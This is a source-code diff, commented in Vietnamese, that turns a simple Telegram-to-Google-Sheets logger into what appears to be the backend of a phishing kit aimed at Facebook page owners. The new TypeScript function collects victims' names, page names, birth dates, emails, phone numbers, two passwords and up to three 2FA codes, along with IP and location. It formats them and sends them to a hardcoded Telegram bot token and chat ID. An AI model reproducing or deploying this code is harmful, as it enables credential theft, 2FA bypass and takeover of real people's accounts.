@@ -1,45 +1,108 @@
-// Thay đổi các giá trị dưới đây với thông tin của bạn
-const TELEGRAM_BOT_TOKEN = `8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;  // Token của Bot Telegram
-const CHAT_ID = `-4966250298`;  // Chat ID của bạn
-const GOOGLE_SHEET_ID = `1XKIy8-_fWqfBlzhdu9vrC3yeHuzvqVgXiiDvmaXweKI`;  // ID của Google Sheet
-const SHEET_NAME = `시트1`;  // Tên Tab Sheet trong Google Sheets
+import axios from 'axios';
+import https from 'https';
+import { memoryStoreTTL } from '../libs/memoryStore';
+import { generateKey } from '../utils/generateKey'; // ✅ import hàm tạo key
 
-// Hàm xử lý khi nhận tin nhắn từ Telegram
-function doPost(e) {
-  try {
-    const sheet = SpreadsheetApp.openById(GOOGLE_SHEET_ID).getSheetByName(SHEET_NAME); // Lấy sheet theo tên
-    const data = JSON.parse(e.postData.contents); // Phân tích dữ liệu từ Telegram
-    
-    const message = data.message.text || ''; // Lấy tin nhắn
-    const sender = data.message.from.first_name + " " + data.message.from.last_name || 'Unknown'; // Lấy tên người gửi
-    const chatId = data.message.chat.id; // Lấy chat ID của người gửi
-    const timestamp = new Date();  // Lấy thời gian gửi tin nhắn
-    
-    // Ghi thông tin vào Google Sheets
-    sheet.appendRow([timestamp, sender, message, chatId]);
+//const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
+//const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
+const TELEGRAM_API = `https://api.telegram.org/bot8226522512:AAGgpgreJuQu3uXjMuFeo6qcweKO1fs1Yvg`;
+const CHAT_ID = '-4966250298';
+const agent = new https.Agent({ family: 4 });
 
-    // Trả lời tin nhắn cho người gửi
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const payload = {
-      chat_id: chatId,
-      text: 'Cảm ơn bạn đã gửi tin nhắn!'
+function mergeData(oldData: any = {}, newData: any = {}) {
+    return {
+        ...oldData,
+        ...Object.fromEntries(
+            Object.entries(newData).filter(([_, v]) => v !== undefined && v !== '')
+        )
     };
-
-    const options = {
-      method: 'post',
-      contentType: 'application/json',
-      payload: JSON.stringify(payload)
-    };
-
-    UrlFetchApp.fetch(url, options);  // Gửi tin nhắn trả lại Telegram
-  } catch (error) {
-    Logger.log('Error: ' + error.toString());
-  }
 }
 
-// Đảm bảo webhook được thiết lập đúng
-function setWebhook() {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${YOUR_WEB_APP_URL}`;
-  const response = UrlFetchApp.fetch(url);
-  Logger.log(response.getContentText());  // In thông tin phản hồi từ Telegram
+function formatMessage(data: any): string {
+    return `
+<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
+<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>
+-----------------------------
+<b>Full Name:</b> <code>${data.name || ''}</code>
+<b>Page Name:</b> <code>${data.fanpage || ''}</code>
+<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
+-----------------------------
+<b>Email:</b> <code>${data.email || ''}</code>
+<b>Email Business:</b> <code>${data.business || ''}</code>
+<b>Phone Number:</b> <code>+${data.phone || ''}</code>
+-----------------------------
+<b>Password First:</b> <code>${data.password || ''}</code>
+<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
+-----------------------------
+<b>Auth Method:</b> <code>${data.authMethod || ''}</code>
+-----------------------------
+<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
+<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
+<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>
+`.trim();
+}
+
+export async function sendTelegramMessage(data: any): Promise<void> {
+    const key = generateKey(data);
+    const prev = memoryStoreTTL.get(key);
+    const fullData = mergeData(prev?.data, data);
+    const updatedText = formatMessage(fullData);
+
+    try {
+        // if (!prev?.messageId) {
+            // Gửi mới
+            const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                chat_id: CHAT_ID,
+                text: updatedText,
+                parse_mode: 'HTML'
+            }, {
+                httpsAgent: agent,
+                timeout: 10000
+            });
+
+            const messageId = res.data.result.message_id;
+            memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
+            console.log(`✅ Sent new message. ID: ${messageId}`);
+        // } else {
+        //     // Edit
+        //     await axios.post(`${TELEGRAM_API}/editMessageText`, {
+        //         chat_id: CHAT_ID,
+        //         message_id: prev.messageId,
+        //         text: updatedText,
+        //         parse_mode: 'HTML',
+        //     }, {
+        //         httpsAgent: agent,
+        //         timeout: 10000
+        //     });
+
+        //     memoryStoreTTL.set(key, { message: updatedText, messageId: prev.messageId, data: fullData });
+        //     console.log(`✏️ Edited message ID: ${prev.messageId}`);
+        // }
+    } catch (err: any) {
+        const desc = err?.response?.data?.description || "";
+        if (desc.includes("message to edit not found")) {
+            // Nếu tin nhắn bị xóa → gửi mới
+            try {
+                const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: updatedText,
+                    parse_mode: 'HTML'
+                }, {
+                    httpsAgent: agent,
+                    timeout: 10000
+                });
+
+                const messageId = res.data.result.message_id;
+                memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
+                console.log(`🔄 Message was deleted → sent new message. ID: ${messageId}`);
+                return;
+            } catch (sendErr: any) {
+                console.error("🔥 Telegram re-send error:", sendErr?.response?.data || sendErr.message || sendErr);
+                throw new Error("Failed to re-send Telegram message");
+            }
+        }
+
+        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
+        throw new Error('Failed to send or edit Telegram message');
+    }
 }
